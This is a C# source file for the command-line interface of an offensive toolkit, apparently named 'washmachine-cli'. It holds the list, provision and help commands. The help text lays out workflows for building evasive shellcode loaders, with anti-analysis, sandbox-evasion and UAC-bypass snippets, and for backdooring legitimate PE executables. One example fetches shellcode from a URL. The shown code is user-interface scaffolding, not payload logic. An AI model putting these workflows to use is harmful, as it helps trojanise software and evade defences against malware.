    private static async Task<int> RunListAsync(string[] args)
    {
        var logger = new ConsoleLogger();
        var paths = new AppPaths();

        if (args.Length == 0)
            return await RunSubMode("list", RunListAsync, PrintListUsage);

        var what = args[0].TrimStart('-').ToLowerInvariant();

        switch (what)
        {
            case "templates":
            {
                var catalog = new YamlCodeSnippetCatalogService(paths);
                var templates = catalog.GetTemplates();

                var table = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Title($"[bold {UiColors.Header}]Templates[/] [{UiColors.Muted}]({templates.Count})[/]")
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]ID[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Display[/]").LeftAligned());

                foreach (var t in templates)
                    table.AddRow($"[{UiColors.Accent}]{Markup.Escape(t.Id)}[/]", $"[{UiColors.Value}]{Markup.Escape(t.Display)}[/]");

                AnsiConsole.Write(table);
                break;
            }
            case "encoders":
            {
                var runner = new Bin2ShellRunner(paths);
                var encodingCatalog = new ShellcodeEncodingCatalogService(runner, paths);

                ShellcodeEncodingCatalog catalog;
                try
                {
                    catalog = await encodingCatalog.GetCatalogAsync();
                }
                catch (Exception ex)
                {
                    AnsiConsole.MarkupLine($"[{UiColors.Warning}]⚠ Bin2Shell is not available.[/]");
                    AnsiConsole.MarkupLine($"[{UiColors.Muted}]  {Markup.Escape(ex.Message)}[/]");
                    AnsiConsole.WriteLine();
                    AnsiConsole.MarkupLine($"[{UiColors.Muted}]Run [{UiColors.Accent}]washmachine-cli provision[/] to download Bin2Shell, then try again.[/]");
                    break;
                }

                var encTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Title($"[bold {UiColors.Header}]Encoders[/] [{UiColors.Muted}]({catalog.Encoders.Count})[/]")
                    .AddColumn($"[{UiColors.Accent}]Index[/]")
                    .AddColumn($"[{UiColors.Accent}]Name[/]")
                    .AddColumn($"[{UiColors.Accent}]Description[/]");

                foreach (var e in catalog.Encoders)
                    encTable.AddRow($"[{UiColors.Hex}]{e.Index}[/]", $"[{UiColors.Value}]{Markup.Escape(e.Name)}[/]", $"[{UiColors.Muted}]{Markup.Escape(e.Description)}[/]");

                AnsiConsole.Write(encTable);
                AnsiConsole.WriteLine();

                var envTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Title($"[bold {UiColors.Header}]Envelopes[/] [{UiColors.Muted}]({catalog.Envelopes.Count})[/]")
                    .AddColumn($"[{UiColors.Accent}]Index[/]")
                    .AddColumn($"[{UiColors.Accent}]Name[/]")
                    .AddColumn($"[{UiColors.Accent}]Description[/]");

                foreach (var e in catalog.Envelopes)
                    envTable.AddRow($"[{UiColors.Hex}]{e.Index}[/]", $"[{UiColors.Value}]{Markup.Escape(e.Name)}[/]", $"[{UiColors.Muted}]{Markup.Escape(e.Description)}[/]");

                AnsiConsole.Write(envTable);
                break;
            }
            case "snippets":
            {
                var catalog = new YamlCodeSnippetCatalogService(paths);
                var sections = catalog.GetAllSections();

                var tree = new Tree($"[bold {UiColors.Header}]Snippet Catalog[/] [{UiColors.Muted}]({sections.Count} sections)[/]");

                foreach (var s in sections)
                {
                    var sectionKey = !string.IsNullOrWhiteSpace(s.Template) ? s.Template : s.Header;
                    var node = tree.AddNode(
                        $"[bold {UiColors.Warning}]{Markup.Escape(s.Header)}[/] [{UiColors.Muted}]({s.Items.Count} items)[/]  " +
                        $"[{UiColors.Muted}]--snippet {Markup.Escape(sectionKey)}=<id>[/]");
                    foreach (var item in s.Items)
                    {
                        var label = item.IsDefault
                            ? $"[{UiColors.Success}]{Markup.Escape(item.Id)}[/] \u2014 {Markup.Escape(item.Display)} [{UiColors.Success}]\u2605 default[/]"
                            : $"[{UiColors.Value}]{Markup.Escape(item.Id)}[/] \u2014 [{UiColors.Muted}]{Markup.Escape(item.Display)}[/]";
                        node.AddNode(label);
                    }
                }

                AnsiConsole.Write(tree);
                break;
            }
            case "compilers":
            {
                var toolLocator = new CompilerToolLocator(logger);
                var result = await toolLocator.DiscoverAsync();

                if (result.Best != null)
                {
                    AnsiConsole.Write(new Panel($"[{UiColors.Success}]Best compiler:[/] [{UiColors.Muted}]{Markup.Escape(result.Best.Path)}[/] [{UiColors.Muted}]({Markup.Escape($"{result.Best.Kind}")})[/]")
                        .BorderColor(Color.Green)
                        .Border(BoxBorder.Rounded));
                    AnsiConsole.WriteLine();
                }

                var table = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Title($"[bold {UiColors.Header}]Candidates[/] [{UiColors.Muted}]({result.Candidates.Count})[/]")
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Kind[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Path[/]").LeftAligned());

                foreach (var c in result.Candidates)
                    table.AddRow($"[{UiColors.Accent}]{Markup.Escape($"{c.Kind}")}[/]", $"[{UiColors.Muted}]{Markup.Escape(c.Path)}[/]");

                AnsiConsole.Write(table);

                if (result.Errors.Count > 0)
                {
                    AnsiConsole.WriteLine();
                    AnsiConsole.MarkupLine($"[{UiColors.Warning}]Errors:[/]");
                    foreach (var e in result.Errors)
                        AnsiConsole.MarkupLine($"  [{UiColors.Error}]{Markup.Escape(e)}[/]");
                }
                break;
            }
            default:
                AnsiConsole.MarkupLine($"[{UiColors.Error}]Error:[/] Unknown list target: {Markup.Escape(what)}. Use templates, encoders, snippets, or compilers.");
                return 1;
        }

        return 0;
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  provision
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunProvisionAsync(string[] args)
    {
        var logger = new ConsoleLogger();
        var paths = new AppPaths();
        var provisioner = new RequirementProvisioner(paths, logger);

        try
        {
            await AnsiConsole.Progress()
                .AutoClear(false)
                .HideCompleted(false)
                .Columns(new ProgressColumn[]
                {
                    new TaskDescriptionColumn(),
                    new ProgressBarColumn(),
                    new PercentageColumn(),
                    new SpinnerColumn(),
                })
                .StartAsync(async ctx =>
                {
                    var task = ctx.AddTask("Provisioning...");
                    task.IsIndeterminate = true;
                    var reporter = new SpectreProgressReporter(task);
                    await provisioner.EnsureRequirementsAsync(reporter);
                });

            return 0;
        }
        catch (Exception ex)
        {
            logger.Error($"Provisioning failed: {ex.Message}");
            return 1;
        }
    }

    private static int PrintEncodeUsage()
    {
        UsageFormatter.Print(new CommandUsage(
            Name: "encode",
            Syntax: $"encode [{UiColors.Warning}]--shellcode <file>[/] [{UiColors.Muted}][[options]][/]",
            Description: "Encode shellcode via Bin2Shell and build a loader executable from a template",
            Required: new[]
            {
                new UsageOption("--shellcode, -s <file>", "Path to shellcode .bin file"),
                new UsageOption("--shellcode-hex <hex>", "Hex-encoded shellcode string"),
                new UsageOption("--shellcode-url, -u <url>", "URL to fetch shellcode from"),
            },
            Options: new[]
            {
                new UsageOption("--template, -t <id>", "Template ID (use 'list --templates' to see options)", "shellcode-minimal"),
                new UsageOption("--encoder, -e <index>", "Bin2Shell encoder index", "0 (none)"),
                new UsageOption("--envelope, -v <index>", "Bin2Shell envelope index", "0 (none)"),
                new UsageOption("--snippet <section=id>", "Override a snippet section (repeatable, see below)"),
                new UsageOption("--verbose", "Enable verbose logging"),
                new UsageOption("--json", "Output results as JSON"),
            },
            Examples: new[]
            {
                new UsageExample("encode -s payload.bin", "Encode with the default template"),
                new UsageExample("encode -s payload.bin -t shellcode-minimal", "Specify a template explicitly"),
                new UsageExample("encode --shellcode-hex FC4883E4F0... -e 1", "Encode from hex with XOR encoder"),
                new UsageExample("encode -u http://host/shell.bin --verbose", "Fetch shellcode from URL"),
                new UsageExample("encode -s payload.bin --snippet antiemulation=SirAllocALot", "Override the anti-emulation snippet"),
                new UsageExample("encode -s p.bin --snippet antiemulation=SirAllocALot --snippet guardrails=domain_check", "Stack multiple snippets"),
            },
            Notes: new[]
            {
                "Provide exactly one shellcode source: --shellcode, --shellcode-hex, or --shellcode-url.",
                "",
                "The encode command processes shellcode through Bin2Shell encoding, merges it into",
                "a C++ template with optional evasion snippets, and compiles the final loader.",
                "",
                $"[bold {UiColors.Accent}]Snippet Selection (--snippet):[/]",
                "  Snippets are organized into sections (playbook categories). Each section",
                "  offers multiple technique choices. Use --snippet to override the default:",
                "",
                $"  [{UiColors.Accent}]--snippet <section>=<snippet_id>[/]",
                "",
                $"  [{UiColors.Label}]Example sections:[/] antiemulation, antianalysis, antidebugging, antisandbox,",
                "  guardrails, decoy, processinjection, shellcodeexecution, uacbypass, genericpayload",
                "",
                $"  Run [{UiColors.Accent}]list --snippets[/] to see all available sections and snippet IDs.",
                $"  Run [{UiColors.Accent}]list --templates[/] to see available code templates.",
                $"  Run [{UiColors.Accent}]list --encoders[/] to see available Bin2Shell encoders and envelopes.",
            }));
        return 0;
    }

    private static int PrintAnalyzeUsage()
    {
        UsageFormatter.Print(new CommandUsage(
            Name: "analyze",
            Syntax: $"analyze [{UiColors.Warning}]<pe-file>[/] [{UiColors.Muted}][[options]][/]",
            Description: "Analyze a PE file — headers, sections, imports, code caves",
            Required: new[]
            {
                new UsageOption("<pe-file>", "Path to the PE file to analyze"),
            },
            Options: new[]
            {
                new UsageOption("--json", "Output results as JSON"),
            },
            Examples: new[]
            {
                new UsageExample("analyze target.exe", "Analyze a PE executable"),
                new UsageExample("analyze malware.dll --json", "Analyze a DLL with JSON output"),
            },
            Notes: new[]
            {
                "Displays architecture, sections, imports, exports, entry point, and code caves.",
                "Useful for recon before backdooring or debugging injection issues.",
            }));
        return 0;
    }

    private static int PrintListUsage()
    {
        UsageFormatter.Print(new CommandUsage(
            Name: "list",
            Syntax: $"list [{UiColors.Warning}]<target>[/]",
            Description: "List available templates, encoders, snippets, or compilers",
            Required: new[]
            {
                new UsageOption("--templates", "List available code templates"),
                new UsageOption("--encoders", "List available encoders and envelopes"),
                new UsageOption("--snippets", "List available snippet sections and items"),
                new UsageOption("--compilers", "List discovered compiler toolchains"),
            },
            Examples: new[]
            {
                new UsageExample("list --templates", "Show code templates"),
                new UsageExample("list --encoders", "Show Bin2Shell encoders and envelopes"),
                new UsageExample("list --snippets", "Show snippet sections and their IDs"),
                new UsageExample("list --compilers", "Show discovered C/C++ compilers"),
            }));
        return 0;
    }

    private static int PrintProvisionUsage()
    {
        UsageFormatter.Print(new CommandUsage(
            Name: "provision",
            Syntax: "provision",
            Description: "Download and install required external tools (Bin2Shell)",
            Examples: new[]
            {
                new UsageExample("provision", "Download and install Bin2Shell"),
            },
            Notes: new[]
            {
                "Run this once after installation to set up Bin2Shell for encoding support.",
                "Requires an active internet connection.",
            }));
        return 0;
    }

    private static int PrintTestUsage()
    {
        UsageFormatter.Print(new CommandUsage(
            Name: "test",
            Syntax: $"test [{UiColors.Muted}][[options]][/]",
            Description: "Run the automated test harness against the toolkit",
            Examples: new[]
            {
                new UsageExample("test", "Run all automated tests"),
                new UsageExample("test --help", "Show test options"),
            }));
        return 0;
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  help
    // ═══════════════════════════════════════════════════════════════════════

    private static int PrintUsage()
    {
        AnsiConsole.WriteLine();

        var commandTable = new Table()
            .Border(TableBorder.Simple)
            .BorderColor(UiColors.BoxBorderColor)
            .AddColumn(new TableColumn($"[{UiColors.Accent}]Command[/]"))
            .AddColumn(new TableColumn($"[{UiColors.Accent}]Description[/]"));

        commandTable.AddRow($"[{UiColors.Accent}]encode[/]",    $"[{UiColors.Value}]Encode shellcode via Bin2Shell and build a loader executable[/]");
        commandTable.AddRow($"[{UiColors.Accent}]analyze[/]",   $"[{UiColors.Value}]Analyze a PE file (headers, sections, imports, code caves)[/]");
        commandTable.AddRow($"[{UiColors.Accent}]backdoor[/]",  $"[{UiColors.Value}]Inject shellcode into an existing PE file[/]");
        commandTable.AddRow($"[{UiColors.Accent}]strip[/]",     $"[{UiColors.Value}]Extract flat binary (.bin) from a PE file[/]");
        commandTable.AddRow($"[{UiColors.Accent}]list[/]",      $"[{UiColors.Value}]List available templates, encoders, snippets, or compilers[/]");
        commandTable.AddRow($"[{UiColors.Accent}]provision[/]", $"[{UiColors.Value}]Download and install required external tools (Bin2Shell)[/]");
        commandTable.AddRow($"[{UiColors.Accent}]test[/]",      $"[{UiColors.Value}]Run the automated test harness[/]");

        AnsiConsole.Write(UsageFormatter.MakePanel("Core Commands", commandTable));

        var usageRows = new Rows(
            new Markup($"[{UiColors.Muted}]washmachine-cli[/] [{UiColors.Accent}]<command>[/] [{UiColors.Muted}][[options]][/]"));
        AnsiConsole.Write(UsageFormatter.MakePanel("Usage", usageRows));

        var exampleRows = new Rows(
            new Markup($"[{UiColors.Accent}]$[/] [{UiColors.Value}]washmachine-cli encode -s payload.bin -t shellcode-minimal[/]"),
            new Markup($"[{UiColors.Accent}]$[/] [{UiColors.Value}]washmachine-cli backdoor --pe app.exe -s payload.bin -m new-section[/]"),
            new Markup($"[{UiColors.Accent}]$[/] [{UiColors.Value}]washmachine-cli analyze target.exe[/]"),
            new Markup($"[{UiColors.Accent}]$[/] [{UiColors.Value}]washmachine-cli strip loader.exe -o loader.bin[/]"),
            new Markup($"[{UiColors.Accent}]$[/] [{UiColors.Value}]washmachine-cli list --templates[/]"),
            new Text(""),
            new Markup($"[{UiColors.Muted}]Run[/] [{UiColors.Accent}]help <command>[/] [{UiColors.Muted}]for detailed options, or[/] [{UiColors.Accent}]help --all[/] [{UiColors.Muted}]for extended reference.[/]"));
        AnsiConsole.Write(UsageFormatter.MakePanel("Quick Examples", exampleRows));

        return 0;
    }

    /// <summary>Extended scrollable help — prints every command's full usage in one view.</summary>
    private static int PrintExtendedHelp()
    {
        AnsiConsole.WriteLine();
        AnsiConsole.Write(new FigletText("WASHMACHINE").Color(UiColors.BannerColor));

        var headerRows = new Rows(
            new Markup($"[{UiColors.Muted}]Scrollable reference for all commands and options.[/]"),
            new Markup($"[{UiColors.Muted}]Tip: Pipe to[/] [{UiColors.Accent}]less[/] [{UiColors.Muted}]or scroll your terminal buffer.[/]"));
        AnsiConsole.Write(UsageFormatter.MakePanel("Extended Command Reference", headerRows));

        // 1. Table of Contents
        var tocTable = new Table()
            .Border(TableBorder.Simple)
            .BorderColor(UiColors.BoxBorderColor)
            .AddColumn(new TableColumn($"[{UiColors.Accent}]#[/]").Centered())
            .AddColumn(new TableColumn($"[{UiColors.Accent}]Command[/]"))
            .AddColumn(new TableColumn($"[{UiColors.Accent}]Purpose[/]"));

        tocTable.AddRow($"[{UiColors.Muted}]1[/]", $"[{UiColors.Accent}]encode[/]",    $"[{UiColors.Value}]Encode shellcode via Bin2Shell and build a loader[/]");
        tocTable.AddRow($"[{UiColors.Muted}]2[/]", $"[{UiColors.Accent}]analyze[/]",   $"[{UiColors.Value}]Inspect PE headers, sections, imports, code caves[/]");
        tocTable.AddRow($"[{UiColors.Muted}]3[/]", $"[{UiColors.Accent}]backdoor[/]",  $"[{UiColors.Value}]Inject shellcode into an existing PE binary[/]");
        tocTable.AddRow($"[{UiColors.Muted}]4[/]", $"[{UiColors.Accent}]strip[/]",     $"[{UiColors.Value}]Extract flat binary from PE sections[/]");
        tocTable.AddRow($"[{UiColors.Muted}]5[/]", $"[{UiColors.Accent}]list[/]",      $"[{UiColors.Value}]List templates, encoders, snippets, compilers[/]");
        tocTable.AddRow($"[{UiColors.Muted}]6[/]", $"[{UiColors.Accent}]provision[/]", $"[{UiColors.Value}]Download external tools (Bin2Shell)[/]");
        tocTable.AddRow($"[{UiColors.Muted}]7[/]", $"[{UiColors.Accent}]test[/]",      $"[{UiColors.Value}]Run the automated test harness[/]");
        AnsiConsole.Write(UsageFormatter.MakePanel("Table of Contents", tocTable));

        // 2. Each command's full help
        PrintEncodeUsage();    AnsiConsole.WriteLine();
        PrintAnalyzeUsage();   AnsiConsole.WriteLine();
        PrintBackdoorUsage();  AnsiConsole.WriteLine();
        PrintStripUsage();     AnsiConsole.WriteLine();
        PrintListUsage();      AnsiConsole.WriteLine();
        PrintProvisionUsage(); AnsiConsole.WriteLine();
        PrintTestUsage();      AnsiConsole.WriteLine();

        // 3. Workflow examples
        var workflowRows = new Rows(
            new Markup($"[{UiColors.Accent}]Workflow 1:[/] [{UiColors.Value}]Encode shellcode into a standalone loader[/]"),
            new Markup($"  [{UiColors.Accent}]$[/] [{UiColors.Muted}]washmachine-cli encode -s payload.bin -t shellcode-minimal -e 1[/]"),
            new Text(""),
            new Markup($"[{UiColors.Accent}]Workflow 2:[/] [{UiColors.Value}]Backdoor a legitimate PE with shellcode[/]"),
            new Markup($"  [{UiColors.Accent}]$[/] [{UiColors.Muted}]washmachine-cli analyze target.exe[/]"),
            new Markup($"  [{UiColors.Accent}]$[/] [{UiColors.Muted}]washmachine-cli backdoor --pe target.exe -s payload.bin -m new-section -o patched.exe[/]"),
            new Text(""),
            new Markup($"[{UiColors.Accent}]Workflow 3:[/] [{UiColors.Value}]Strip a loader to flat binary, then inject into PE[/]"),
            new Markup($"  [{UiColors.Accent}]$[/] [{UiColors.Muted}]washmachine-cli encode -s payload.bin[/]"),
            new Markup($"  [{UiColors.Accent}]$[/] [{UiColors.Muted}]washmachine-cli strip loader.exe -o loader.bin[/]"),
            new Markup($"  [{UiColors.Accent}]$[/] [{UiColors.Muted}]washmachine-cli backdoor --pe target.exe -s loader.bin -m code-cave[/]"));
        AnsiConsole.Write(UsageFormatter.MakePanel("Typical Workflows", workflowRows));

        // 4. Injection Methods Quick Reference
        var injTable = new Table()
            .Border(TableBorder.Simple)
            .BorderColor(UiColors.BoxBorderColor)
            .AddColumn(new TableColumn($"[{UiColors.Accent}]Method[/]"))
            .AddColumn(new TableColumn($"[{UiColors.Accent}]Flag[/]"))
            .AddColumn(new TableColumn($"[{UiColors.Accent}]Arch[/]"))
            .AddColumn(new TableColumn($"[{UiColors.Accent}]Description[/]"));

        injTable.AddRow($"[{UiColors.Value}]Code Cave[/]",           $"[{UiColors.Accent}]-m code-cave[/]",    $"[{UiColors.Muted}]x86/x64[/]", $"[{UiColors.Muted}]Reuse slack space in existing sections[/]");
        injTable.AddRow($"[{UiColors.Value}]New Section[/]",         $"[{UiColors.Accent}]-m new-section[/]",  $"[{UiColors.Muted}]x86/x64[/]", $"[{UiColors.Muted}]Append a new PE section with payload[/]");
        injTable.AddRow($"[{UiColors.Value}]Section Extension[/]",   $"[{UiColors.Accent}]-m section-ext[/]",  $"[{UiColors.Muted}]x86/x64[/]", $"[{UiColors.Muted}]Extend last section to embed payload[/]");
        injTable.AddRow($"[{UiColors.Value}]Text Padding[/]",        $"[{UiColors.Accent}]-m text-pad[/]",     $"[{UiColors.Muted}]x86/x64[/]", $"[{UiColors.Muted}]Write into .text VirtualSize↔RawSize gap[/]");
        injTable.AddRow($"[{UiColors.Value}]TLS Callback[/]",        $"[{UiColors.Accent}]-m tls-callback[/]", $"[{UiColors.Muted}]x64[/]",     $"[{UiColors.Muted}]TLS callback runs payload before main[/]");
        AnsiConsole.Write(UsageFormatter.MakePanel("Injection Methods Quick Reference", injTable));

        // 5. Global notes
        var noteRows = new Rows(
            new Markup($"[{UiColors.Muted}]• All commands support[/] [{UiColors.Accent}]--help[/] [{UiColors.Muted}]or[/] [{UiColors.Accent}]-h[/] [{UiColors.Muted}]for individual help[/]"),
            new Markup($"[{UiColors.Muted}]• Use[/] [{UiColors.Accent}]--json[/] [{UiColors.Muted}]where available for machine-readable output[/]"),
            new Markup($"[{UiColors.Muted}]• Run[/] [{UiColors.Accent}]provision[/] [{UiColors.Muted}]once before using encoding features[/]"),
            new Markup($"[{UiColors.Muted}]• Interactive REPL mode: launch without arguments for an interactive session[/]"));
        AnsiConsole.Write(UsageFormatter.MakePanel("Global Notes", noteRows));

        return 0;
    }

    private static int PrintUnknownCommand(string command)
    {
        var validCommands = new[] { "encode", "analyze", "backdoor", "strip", "list", "provision", "test", "help" };

        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine($"[{UiColors.Error}]Error:[/] [{UiColors.Value}]Unknown command '{Markup.Escape(command)}'[/]");
        AnsiConsole.WriteLine();

        var suggestions = validCommands
            .Where(c => c.Contains(command, StringComparison.OrdinalIgnoreCase)
                     || command.Contains(c, StringComparison.OrdinalIgnoreCase)
                     || LevenshteinDistance(c, command) <= 3)
            .ToArray();

        if (suggestions.Length > 0)
        {
            AnsiConsole.MarkupLine($"[{UiColors.Muted}]Did you mean:[/]");
            foreach (var s in suggestions)
                AnsiConsole.MarkupLine($"  [{UiColors.Accent}]{s}[/]");
            AnsiConsole.WriteLine();
        }

        AnsiConsole.MarkupLine($"[{UiColors.Muted}]Available commands:[/]");
        foreach (var c in validCommands.Where(c => c != "help"))
            AnsiConsole.MarkupLine($"  [{UiColors.Accent}]{c}[/]");

        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine($"[{UiColors.Muted}]Run[/] [{UiColors.Accent}]help[/] [{UiColors.Muted}]for usage information.[/]");
        return 1;
    }

    private static int LevenshteinDistance(string s, string t)
    {
        int n = s.Length, m = t.Length;
        var d = new int[n + 1, m + 1];
        for (int i = 0; i <= n; i++) d[i, 0] = i;
        for (int j = 0; j <= m; j++) d[0, j] = j;
        for (int i = 1; i <= n; i++)
            for (int j = 1; j <= m; j++)
                d[i, j] = Math.Min(Math.Min(d[i - 1, j] + 1, d[i, j - 1] + 1),
                    d[i - 1, j - 1] + (s[i - 1] == t[j - 1] ? 0 : 1));
        return d[n, m];
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  Spectre.Console progress reporter
    // ═══════════════════════════════════════════════════════════════════════

    private sealed class SpectreProgressReporter : IProgressReporter
    {
        private readonly ProgressTask _task;

        public SpectreProgressReporter(ProgressTask task)
        {
            _task = task;
        }

        public void UpdateStatus(string message, int percentComplete)
        {
            _task.Description = message;
            if (percentComplete >= 0)
            {
                _task.IsIndeterminate = false;
                _task.Value = percentComplete;
            }
            else
            {
                _task.IsIndeterminate = true;
            }
        }

        public void Close()
        {
            _task.Value = 100;
            _task.StopTask();
        }
    }
}
